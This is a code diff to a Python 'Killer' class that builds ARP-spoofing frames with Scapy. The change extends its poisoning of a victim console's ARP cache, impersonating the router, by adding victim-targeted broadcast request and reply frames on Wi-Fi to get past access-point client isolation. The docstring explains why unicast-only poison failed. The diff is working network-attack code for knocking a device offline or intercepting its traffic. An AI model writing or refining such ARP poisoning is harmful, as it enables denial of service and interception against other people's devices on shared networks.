@@ -1121,19 +1121,18 @@ class Killer:
             pass
 
     def _poison_frames(self, victim):
-        """Unicast ARP poison only (victim MAC + router MAC).
-
-        Do **not** broadcast gateway impersonation. A ff:ff:ff ARP with
-        ``psrc=router`` teaches every listening client — including this PC —
-        that we are the gateway. Combined with ``disable_ip_forwarding`` that
-        drops this machine's internet for minutes after a short Kill toggle.
-
-        The ethernet PS5 is STA-to-wired, not STA-to-STA. Unicast to its MAC
-        is the delivery that does not take the rest of the LAN down.
+        """Unicast ARP poison, plus Wi‑Fi victim-targeted broadcast when isolation drops STA unicast.
 
         Send both ARP *request* (op=1) and *reply* (op=2) unicast to the
         victim and router. Many stacks ignore unsolicited unicast replies but
-        still cache the sender mapping from a request.
+        still cache the sender mapping from a request — reply-only poison was
+        too weak after broadcast removal.
+
+        On Wi‑Fi, AP client isolation often drops STA-to-STA *unicast*, so the
+        ethernet PS5 never sees those frames and Kill does nothing. Add
+        victim-targeted L2 broadcast copies (pdst/hwdst still this victim only
+        — not a GARP). This PC staying online is not proof those copies are
+        safe for every LAN; they are how poison reaches this console.
         """
         src = self._poison_hwsrc()
         # Victim: "router is at PC MAC"
@@ -1176,6 +1175,34 @@ class Killer:
             to_router_req,
             to_router_reply,
         ]
+        try:
+            from tools.mitm_probe import iface_is_wireless
+
+            wifi = iface_is_wireless(self.iface)
+        except Exception:
+            wifi = False
+        if wifi:
+            bcast = 'ff:ff:ff:ff:ff:ff'
+            frames.extend(
+                [
+                    Ether(src=src, dst=bcast)
+                    / ARP(
+                        op=1,
+                        psrc=self.router['ip'],
+                        hwsrc=src,
+                        pdst=victim['ip'],
+                        hwdst=victim['mac'],
+                    ),
+                    Ether(src=src, dst=bcast)
+                    / ARP(
+                        op=2,
+                        psrc=self.router['ip'],
+                        hwsrc=src,
+                        pdst=victim['ip'],
+                        hwdst=victim['mac'],
+                    ),
+                ]
+            )
         return frames
 
     def _poison_arp_now(self, victim, seq=0, repeats=1, delay_s=0.0):
